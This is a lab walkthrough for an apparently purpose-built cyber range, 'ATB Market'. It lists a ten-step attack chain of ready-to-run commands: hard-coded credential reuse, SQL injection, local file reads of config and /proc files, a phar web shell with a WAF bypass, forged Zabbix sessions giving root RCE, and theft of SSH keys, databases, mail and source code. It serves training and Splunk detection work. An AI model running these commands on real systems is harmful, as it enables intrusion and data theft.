# ATB Market — Attack Chain (10 steps)

Every step maps to a running container and a **copy-pasteable command** that
works against the lab. Hostnames resolve via the compose network; from the host
use `localhost:<port>` (port column in [`asset-inventory.md`](./asset-inventory.md)).
The `attack/solve.py` reference solver (organizers: `make up-dev && make solve`)
executes the whole thing end-to-end and prints PASS/FAIL per step.

Base URL convention below: `http://localhost:<port>` from the host, or
`http://<service>` from inside the `attacker` container.

---

## Step 1 — Recon (mobapp + Moodle leak)

**1a. Hard-coded API creds from the APK** (`mobapp`):
```bash
curl -s -u 'reg_user:basic*88password!prod99' \
  -H 'Content-Type: application/json' \
  -d '{"phoneNumber":"+380000000000"}' \
  http://localhost:8081/register/login
# → 201 {"token":"eyJ...","message":"Auth OTP was sent..."}
```
Wrong Basic creds → `401`. (Detects as brute-force / hard-coded-cred use.)

**1b. Unauth Moodle config disclosure** (`education`):
```bash
curl -s -X POST 'http://localhost:8082/md/blocks/moco_news/ajax.php' \
  --data 'procedure=getPosts'
# → 200 JSON leaking dbuser/dbpass/smtpuser/smtppass/passwordsaltmain/siteadmins
```

## Step 2 — Boolean SQL injection (`www`)

Array **key** `filter[8][490]` is concatenated into SQL; the value is
parametrised. Boolean oracle = HTTP 200 (true) vs 500 (false/error):
```bash
curl -s -o /dev/null -w '%{http_code}\n' 'http://localhost:8080/shop/catalog/novetly?filter[8][490]=1'          # 200 baseline
curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/shop/catalog/novetly?filter[8][490']=1"         # 500 error
curl -s -o /dev/null -w '%{http_code}\n' 'http://localhost:8080/shop/catalog/novetly?filter[8][490 AND 1=1]=1'  # 200 true
```
Blind extraction helper: `attack/sqli_oracle.py` pulls `version()`,
`database()`, `user()`, `COUNT(*) FROM users` via the 200/500 oracle.

## Step 3 — Supplier portal self-registration (`supplier`)

```bash
curl -s 'http://localhost:8083/index.php?entryPoint=RegistrationStep3' \
  --data 'user_name=b9atbsup01@guerrillamailblock.com'
curl -s 'http://localhost:8083/index.php?entryPoint=GeneratePassword' \
  --data 'user_name=b9atbsup01@guerrillamailblock.com&link=1'
# → returns/log emits GUID reset link
GUID=... # from response
curl -s "http://localhost:8083/index.php?entryPoint=Changenewpassword&guid=$GUID" \
  --data 'password1=AtbB9Sup2026x!&password2=AtbB9Sup2026x!'
```

## Step 4 — LFI via Import mapping (`supplier`)

```bash
# relative read -> config.php
curl -s 'http://localhost:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true' \
  --data 'importFile=config.php&import_module=AOS_Products_Quotes'
# absolute reads -> Oracle/MEDOC creds, hostname, cmdline
curl -s 'http://localhost:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true' \
  --data 'importFile=/var/www/config_override.php'
curl -s '...' --data 'importFile=/etc/hostname'          # sp-web-p01
curl -s '...' --data 'importFile=/proc/self/cmdline'     # php-fpm: pool www
```

## Step 5 — phar polyglot web-shell (`supplier`)

WAF scans only first ~180 KB; pad with 200 KB of `A` then the `phar://` payload.
```bash
python3 attack/upload_phar.py            # uploads attachment_xlsx.png polyglot
curl -s 'http://localhost:8083/upload/shell.php?z='$(printf 'id' | base64)
# → uid=993(nginx) ... sp-web-p01
```

## Step 6 — Privilege escalation via Grafana → Zabbix (`grafana`,`zabbix`)

```bash
# Grafana login with reused edu creds, used to write a forged session into Zabbix DB
python3 attack/forge_zabbix_session.py   # INSERT sessions + HMAC(session_key) cookie
# admin on Zabbix → RCE as root via script.create
curl -sk 'http://localhost:8084/api_jsonrpc.php' \
  -H 'Content-Type: application/json' -H "Cookie: zbx_session=$ZBX" \
  -d '{"jsonrpc":"2.0","method":"script.create","params":{"command":"id","execute_on":1,"type":0,"scope":2,"host_access":2},"id":1}'
# → uid=0 on zb-app-p01
```

## Step 7 — Keys to everything (`squid`,`jenkins`,`backup`,`bastion`)

Pivot through squid, ZBXD `system.run` on Jenkins, reach CIFS backup, pull the key:
```bash
python3 attack/zbxd_run.py jenkins.atbmarket.com 'cat /mnt/BACKUP/root.tar.gz | base64' \
  | base64 -d > root.tar.gz
tar -xzf root.tar.gz root/.ssh/id_rsa_root
ssh -i root/.ssh/id_rsa_root root@localhost -p 2210   # bastion
```

## Step 8 — Databases (mysql/postgres/oracle mocks)

```bash
mysql  -h127.0.0.1 -P3306 -uishop -p'rEQaZ55o7x_E53oC' ishop -e 'SELECT COUNT(*) FROM users;'
psql 'postgresql://asu:Qw123456@127.0.0.1:5432/asu' -c 'SELECT count(*) FROM employees;'
python3 attack/oracle_probe.py erpdb 1581 XX_SUP_PORTAL_RO S0h6jWot2fTLSMm   # SELECT 1 FROM DUAL
```

## Step 9 — Mail (`exchange`)

```bash
curl -sk -u 'supplier@atbmarket.com:supplier123569' \
  -H 'Content-Type: text/xml' --data @attack/ews_finditem.xml \
  https://localhost:8444/ews/Exchange.asmx
# → FindItem 15907 items, 27 with live reset GUIDs
```

## Step 10 — Source code (`gitlab`)

```bash
ssh -i root/.ssh/id_rsa_root root@localhost -p 2222 \
  'tar -cf - -C /var/opt/gitlab/git-data repositories | wc -c'   # 524 repos
# and... Splunk default creds:
curl -s -k -u admin:changeme https://localhost:8000/services/server/info -o /dev/null -w '%{http_code}\n'
```

---

### Detection view (Splunk)
Every step emits structured events to `/var/log/atb/*.json`, indexed by Splunk
under index `atb`. See [`../splunk/detections.md`](../splunk/detections.md) for
the SPL that fires on each stage.
